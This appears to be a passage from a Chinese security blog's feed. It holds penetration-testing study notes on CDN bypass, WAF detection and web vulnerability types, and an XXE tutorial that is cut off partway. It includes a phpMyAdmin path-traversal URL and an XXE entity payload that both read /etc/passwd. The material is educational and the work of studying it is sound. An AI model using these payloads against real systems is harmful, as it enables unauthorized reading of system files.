docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1623123783733-3cba9200-6e65-4115-b589-0b777315382c.png" alt="img"></p><p>成功访问phpmyadmin之后，访问<code>http://10.1.1.133:8080/?target=db_sql.php%3f/../../../../../../../../etc/passwd</code>实现漏洞利用，得到执行etc&#x2F;passwd的结果：</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623123853171-a2f0af6d-42bd-483d-a96e-02c553f0f297.png" alt="image.png"></p></li></ul><h2 id="6-加密编码算法"><a href="#6-加密编码算法" class="headerlink" title="6. 加密编码算法"></a>6. 加密编码算法</h2><ul><li><p>时间戳</p><p>在线转换工具：<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p></li><li><p>URL编码</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725211231394.png" alt="image-20220725211231394"></p></li><li><p>base64编码</p><p>随着编码的文本增加而增加、由大小写和数字组成且字符结尾一般有两个等号。</p></li><li><p>unescape编码</p><p>和URL编码有点像，特点是一般是%U+四个数字对应着两个字符，主要运用于网站web应用。</p></li><li><p>AES加密</p></li></ul><h2 id="7-x3D-x3D-CDN绕过-x3D-x3D"><a href="#7-x3D-x3D-CDN绕过-x3D-x3D" class="headerlink" title="7. &#x3D;&#x3D;CDN绕过&#x3D;&#x3D;"></a>7. &#x3D;&#x3D;CDN绕过&#x3D;&#x3D;</h2><p>CDN依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。</p><ul><li><p>判断是否存在CDN服务</p><p>利用多节点技术进行请求返回判断<br><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p><p>验证获取到ip是否可信可以采用第三方的ip地址查询工具经行验证。</p><p><a href="https://get-site-ip.com/">https://get-site-ip.com/</a></p><p>cdn网站</p><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p></li><li><p>CDN对安全测试的影响</p><p>CDN会隐藏服务器真实的ip地址，无法对目标网站的操作系统进行渗透，但CDN站点又可以理解为是目标站点的镜像站点（大多数都是静态cdn加速），拥有相同的网站架构，且cdn服务器可与站点服务器进行交互，因此sql注入，xss等漏洞的挖掘并不受太大影响。</p></li><li><p>目前常见的CDN绕过技术</p><p><strong>子域名查询</strong></p><p>因为有些主站是做了CDN服务而子站是没有做CDN服务</p><p><strong>邮件服务查询</strong></p><p>因为邮箱大部分都是内部人在访问、而且访问的量也不是很大，一般是没有做CDN。</p><p><strong>国外地址请求</strong></p><p>因为很多的企业没有在国外部署CDN，要是用国外的地址请求、就容易找到他的真实地址。</p><p><strong>遗留文件、扫描全网</strong></p><p>如PHPinfo信息当中会遗留出ip地址</p><p><strong>黑暗引擎搜索</strong></p><p>fofa、傻蛋、谛听、zoomeye、censys</p><p><strong>特定文件dns历史记录，以量打量</strong></p><p>CDN真实IP地址获取后绑定指向地址，即更改本地HOSTS解析指向文件</p><p><strong>奇淫技巧</strong></p><p>fackcdn、w8fuckcdn、zmap</p><p><strong>借助漏洞</strong></p><p>若存在web漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实ip。例如xss、ssrf、命令执行反弹shell等。</p></li></ul><h2 id="8-信息收集、WAF"><a href="#8-信息收集、WAF" class="headerlink" title="8. 信息收集、WAF"></a>8. 信息收集、WAF</h2><h3 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h3><ul><li><p>目录型站点</p><p>主站上面存在其他的cms程序。</p><p>比如学生网站<a href="http://www.xxx.com的上面通过后台扫描探针发现有一个bbs的目录，一点击发现是一个bbs的论坛网站如：www.xxx.com/bbs。我们把这个称为目录型网站，可以有两种找到漏洞的思路，一个是主站的漏洞另外的一个是bbs上面的漏洞。">www.xxx.com的上面通过后台扫描探针发现有一个bbs的目录，一点击发现是一个bbs的论坛网站如：www.xxx.com/bbs。我们把这个称为目录型网站，可以有两种找到漏洞的思路，一个是主站的漏洞另外的一个是bbs上面的漏洞。</a></p></li><li><p>端口类站点</p><p>有的站点不是使用的是默认的站点80而是其他的端口，可以使用shodan这种工具去收集端口。</p></li><li><p>子域名站点</p><p>比如bbs.goodlift.net是goodlift.net的子域名，且为不同的站点。</p><p>现在的主流网站都是采用的这种模式且子域名和网站之间很有可能是不在同一台的服务器上面。</p></li><li><p>类似域名站点</p><p>例如：京东的网站是jd.com 那么他就有可能是采用了jd.net jd.cn等域名我们采用社工的方式去尝试获取他的相关域名信息。</p></li><li><p>旁注，c段站点</p><p><strong>旁注</strong>：同一个服务器上面存在多个站点、但是你要攻击的是A网站由于各种原因不能完成安全测试。就通过测试B网站进入服务器然后在攻击A网站最终实现目的。</p><p><strong>C段</strong>：不同的服务器上面存在不同的网站，通过扫描发现与你渗透测试的是同一个网段，最终拿下服务器，然后通过内网渗透的方式拿下渗透服务器。</p><p>查询服务器上站点：在线工具：<a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p></li><li><p>搭建软件特征站点</p><p>有的网站是借助于第三方的集成搭建工具实现，例如：PHPstudy、宝塔等环境。这样的集成环境搭建的危害就是泄露了详细的版本信息。</p><p>phpstudy搭建了之后，在默认的站点安装了phpmyadmin。有的网站没有做安全性直接可以通过用户名：root密码：root 登录进入。</p></li></ul><h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p><p><strong>识别WAF的存在</strong>：直接使用工具进行扫描有可能会导致waf将你的ip地址拉入黑名单而不能访问，针对不同的厂商的waf可能存在着不同的绕过思路。</p><ul><li><p>采用工具wafwoof，缺点是并不特别准确</p><p>获取地址：<a href="https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master">https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">unzip wafw00f-master.zip      <span class="comment"># 解压</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">python3.8 setup.py install    <span class="comment"># 安装</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span> -ld wafw00f</span></span><br><span class="line">drwxr-xr-x 6 root root 4096  6月 10 17:22 wafw00f</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> wafw00f</span> </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">python main.py https://www.hlszsb.com/   <span class="comment"># 识别网站https://www.hlszsb.com/</span></span></span><br><span class="line"></span><br><span class="line">[*] Checking https://www.hlszsb.com/</span><br><span class="line">[+] Generic Detection results:</span><br><span class="line">[-] No WAF detected by the generic detection</span><br><span class="line">[~] Number of requests: 7</span><br></pre></td></tr></table></figure></li><li><p>identYwaf</p><p>参考地址：<a href="https://github.com/stamparm/identywaf">https://github.com/stamparm/identywaf</a></p><p>与wafwoof相比运行速度慢，但是比较稳定</p></li><li><p>在有些网站的请求信息当中留下了waf的相关信息</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725213558764.png" alt="image-20220725213558764"></p></li><li><p>nmap</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script==http-waf-fingerprint</span><br><span class="line">nmap --script=http-waf-detect</span><br></pre></td></tr></table></figure></li></ul><h2 id="7-资产收集"><a href="#7-资产收集" class="headerlink" title="7. 资产收集"></a>7. 资产收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Github监控</span><br><span class="line">  便于收集整理最新exp或poc</span><br><span class="line">  便于发现相关测试目标的资产</span><br><span class="line">  server酱：http://sc.ftqq.com/3.version</span><br><span class="line">  GitHub项目监控地址：https://github.com/weixiao9188/wechat_push</span><br><span class="line"></span><br><span class="line"># 各种子域名查询</span><br><span class="line"># DNS,备案,证书</span><br><span class="line"># 全球节点请求cdn</span><br><span class="line">  枚举爆破或解析子域名对应</span><br><span class="line">  便于发现管理员相关的注册信息</span><br><span class="line"></span><br><span class="line">#黑暗引擎相关搜索</span><br><span class="line">fofa, shodan, zoomeye</span><br><span class="line">  </span><br><span class="line">#微信公众号接口获取</span><br><span class="line"># 内部群内部资源</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623572333231-e96bd343-8744-4813-97f1-b8de7edc3eb7.png?x-oss-process=image/resize,w_720,limit_0" alt="image.png"></p><h2 id="8-web漏洞"><a href="#8-web漏洞" class="headerlink" title="8. web漏洞"></a>8. web漏洞</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220725233424804.png" alt="image-20220725233424804"></p><p><strong>漏洞危害情况</strong></p><ol><li><p>获取网站的数据库的权限（数据），后台账号和密码—SQL注入</p></li><li><p>直接获取网站权限—文件上传</p></li></ol><p><strong>漏洞等级划分</strong></p><ol><li><p>高危：文件上传、SQL注入、代码执行、文件包含、未授权访问</p></li><li><p>中危：逻辑安全、目录遍历</p></li><li><p>低危：信息泄露—源码、部分账号密码</p></li></ol><p><strong>漏洞重点内容</strong></p><ol><li><p>CTF：SQL注入、反序列化、代码执行</p></li><li><p>SRC：以上都有，逻辑安全</p></li><li><p>红蓝对抗：高危漏洞—权限</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基础概念与信息收集&quot;&gt;&lt;a href=&quot;#基础概念与信息收集&quot; class=&quot;headerlink&quot; title=&quot;基础概念与信息收集&quot;&gt;&lt;/a&gt;基础概念与信息收集&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/20</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>XXE</title>
    <link href="https://frankcao3.github.io/posts/57467"/>
    <id>https://frankcao3.github.io/posts/57467</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.974Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/08DlKYbVXPtjIK856PBf8w">https://mp.weixin.qq.com/s/08DlKYbVXPtjIK856PBf8w</a></p><p><a href="https://blog.csdn.net/huangyongkang666/article/details/123818066">https://blog.csdn.net/huangyongkang666/article/details/123818066</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>XML外部实体注入(XML External Entity) 简称XXE漏洞。</p><h3 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h3><h4 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h4><p> XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- XML声明 --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- DTD文档类型定义（可选） --&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 文档元素 --&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>XML 是一种很像HTML的标记语言。<br>XML 的设计宗旨是 <strong>传输数据</strong>，而不是显示数据。<br>XML 标签没有被预定义。需要<strong>自行定义标签</strong>。<br>XML 被设计为具有自我描述性。</p><h4 id="XML-和-HTML-之间的差异"><a href="#XML-和-HTML-之间的差异" class="headerlink" title="XML 和 HTML 之间的差异"></a>XML 和 HTML 之间的差异</h4><p>XML 被设计用来<u>传输和存储数据</u>，其焦点是数据的内容。</p><p>HTML 被设计用来<u>显示数据</u>，其焦点是数据的外观。</p><h4 id="XML-用途"><a href="#XML-用途" class="headerlink" title="XML 用途"></a>XML 用途</h4><p>XML 把数据从 HTML 分离<br>XML 简化数据共享<br>XML 简化数据传输<br>XML 简化平台变更<br>XML 用于创建新的互联网语言</p><h4 id="XML-树结构"><a href="#XML-树结构" class="headerlink" title="XML 树结构"></a>XML 树结构</h4><p>XML 文档形成了一种树结构，它从”根部”开始，然后扩展到”枝叶”。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第一行是 XML 声明。它定义 XML 的版本（1.0）和所使用的编码（UTF-8 : 万国码, 可显示各种语言）;</p><p>下一行<code>&lt;note&gt;</code>描述文档的<strong>根元素</strong>（像在说：“本文档是一个便签”）;</p><p>接下来 4 行描述根的 4 个子元素（to, from, heading 以及 body）</p><p><strong>注意</strong>：<em>XML 文档必须包含根元素。该元素是所有其他元素的父元素。</em></p><p>XML 文档中的元素形成了一棵文档树。这棵树从根部开始，并扩展到树的最底端。所有的元素都可以有子元素。</p><h4 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h4><ol><li><p><strong>XML 必须包含根元素，它是所有其他元素的父元素</strong></p></li><li><p><strong>XML 声明文件的可选部分，如果存在需要放在文档的第一行</strong></p><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code></p></li><li><p><strong>所有的 XML 元素都必须有一个关闭标签</strong>，在 HTML 中，某些元素的关闭标签不是必须的，比如<code>&lt;p&gt;</code>。</p></li><li><p><strong>XML 标签对大小写敏感</strong></p></li><li><p><strong>XML 必须正确嵌套</strong>，也就是标签的嵌套顺序要正确。</p><p><code>&lt;b&gt;&lt;i&gt;This text is bold and italic&lt;/i&gt;&lt;/b&gt;</code></p></li><li><p><strong>XML 属性值必须加引号</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;note date=&quot;12/11/2007&quot;&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>实体引用</strong></p><p>在 XML 中，一些字符拥有特殊的意义</p><p>在 XML 中，有 5 个预定义的实体引用:</p></li></ol><table><thead><tr><th><code>&amp;lt;</code></th><th>&lt;</th><th>less than</th></tr></thead><tbody><tr><td><code>&amp;gt;</code></td><td>&gt;</td><td>greater than</td></tr><tr><td><code>&amp;amp;</code></td><td>&amp;</td><td>ampersand</td></tr><tr><td><code>&amp;apos;</code></td><td>’</td><td>apostrophe</td></tr><tr><td><code>&amp;quot;</code></td><td>“</td><td>quotation mark</td></tr></tbody></table><ol start="8"><li><p><strong>XML 中的注释</strong></p><p><code>&lt;!-- This is a comment --&gt;</code></p></li><li><p><strong>在 XML 中，空格会被保留</strong></p><p>但是 HTML 会把多个连续的空格字符裁减（合并）为一个：</p></li><li><p><strong>XML 以 LF 存储换行</strong></p><p>在 Windows 应用程序中，换行通常以一对字符来存储：<strong>回车符（CR）和换行符（LF）</strong>。</p><p>在 Unix 和 Mac OSX 中，使用 <strong>LF</strong> 来存储新行。</p><p>在旧的 Mac 系统中，使用 <strong>CR</strong> 来存储新行。</p><p>XML 以 <strong>LF</strong> 存储换行。</p></li><li><p><strong>XML 元素</strong></p><p>XML 元素指的是从（且包括）开始标签直到（且包括）结束标签的部分。XML 元素是可扩展的。</p><p>比如<code>&lt;body&gt;Don&#39;t forget me this weekend!&lt;/body&gt;</code>。</p></li><li><p><strong>XML 属性</strong></p><p>XML元素具有属性，类似 HTML。属性（Attribute）提供有关元素的额外信息。</p><p>属性通常提供不属于数据组成部分的信息。在下面的实例中，文件类型与数据无关，但是对需要处理这个元素的软件来说却很重要。</p><p>比如：<code>&lt;file type=&quot;gif&quot;&gt;computer.gif&lt;/file&gt;</code>、<code>&lt;img src=&quot;computer.gif&quot; /&gt;</code>。</p><p><strong>XML 属性必须加引号</strong></p><ul><li>属性不能包含多个值（元素可以）</li><li>属性不能包含树结构（元素可以）</li><li>属性不容易扩展（为未来的变化）</li></ul><p>属性难以阅读和维护。请尽量使用元素来描述数据。而仅仅使用属性来提供与数据无关的信息。</p></li></ol><h3 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h3><p>文档类型定义（DTD）可<strong>定义合法的XML文档构建模块</strong>。它使用一系列合法的元素来<strong>定义文档的结构</strong>。 </p><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><h4 id="XML内部的-DOCTYPE-声明"><a href="#XML内部的-DOCTYPE-声明" class="headerlink" title="XML内部的 DOCTYPE 声明"></a>XML内部的 DOCTYPE 声明</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><h4 id="外部文档声明"><a href="#外部文档声明" class="headerlink" title="外部文档声明"></a>外部文档声明</h4><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p><p>XML中定义 DOCTYPE 的语法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root-element</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;filename&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>比如，有如下note元素，其中第一行代码表示note元素的DTD声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>note.dtd文件的内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><h4 id="实体声明"><a href="#实体声明" class="headerlink" title="实体声明"></a>实体声明</h4><p><strong>dtd中的实体是用来定义普通文本的变量。</strong>可分为一般实体和参数实体</p><ol><li><p>一般实体的声明语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式： <strong><code>&amp;实体名;</code></strong></p></li><li><p>参数实体<strong>只能在DTD中使用</strong>，参数实体的声明格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式： <strong><code>%实体名;</code></strong></p></li></ol><h4 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h4><p><strong>dtd中的实体被声明为内部字符数据（普通文本）</strong></p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DTD 的实体:</span><br><span class="line">&lt;!ENTITY writer &quot;Donald Duck.&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML 实例：</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><h4 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h4><p><strong>dtd中的实体被声明为远程&#x2F;外部文本文件</strong></p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DTD 的实体:</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML 实例:</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure><h4 id="PCDATA-简介"><a href="#PCDATA-简介" class="headerlink" title="PCDATA 简介"></a>PCDATA 简介</h4><p>PCDATA 的意思是被解析的<strong>字符数据</strong>（parsed character data）。可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。</p><p>PCDATA 是<strong>会被解析器解析的文本</strong>。这些文本将被解析器检查实体以及标记。</p><p>文本中的标签会被当作标记来处理，而实体会被展开。不过，被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。</p><h4 id="CDATA简介"><a href="#CDATA简介" class="headerlink" title="CDATA简介"></a>CDATA简介</h4><p>CDATA 的意思是<strong>字符数据</strong>（character data）。</p><p>CDATA 是<strong>不会被解析器解析的文本</strong>。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p> XXE 漏洞全称XML External Entity Injection，即 XML 外部实体注入漏洞，XXE 漏洞发生<strong>在应用程序解析 XML 输入时，没有禁止外部实体的加载，导致可加载恶意外部文件</strong>，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><h3 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h3><p>xxe漏洞触发的点往往是<strong>可以上传xml文件的位置，没有对上传的xml文件进行过滤</strong>，导致可上传恶意 xml文件。</p><h2 id="XXE-攻击方式"><a href="#XXE-攻击方式" class="headerlink" title="XXE 攻击方式"></a>XXE 攻击方式</h2><h3 id="构建外部实体注入方法"><a href="#构建外部实体注入方法" class="headerlink" title="构建外部实体注入方法"></a>构建外部实体注入方法</h3><h4 id="直接通过DTD外部实体声明"><a href="#直接通过DTD外部实体声明" class="headerlink" title="直接通过DTD外部实体声明"></a>直接通过<u>DTD外部实体</u>声明</h4><p><u>在XML文档内直接声明外部实体。</u></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd/&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure><h4 id="先引入外部DTD文档，再引入外部实体声明"><a href="#先引入外部DTD文档，再引入外部实体声明" class="headerlink" title="先引入外部DTD文档，再引入外部实体声明"></a>先引入<u>外部DTD文档</u>，再引入<u>外部实体</u>声明</h4><p><u>在XML文档内直接引入外部文档，再在外部文档内引入外部实体。</u></p><p>XML 文件内容（包含DTD外部文档）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a SYSTEM 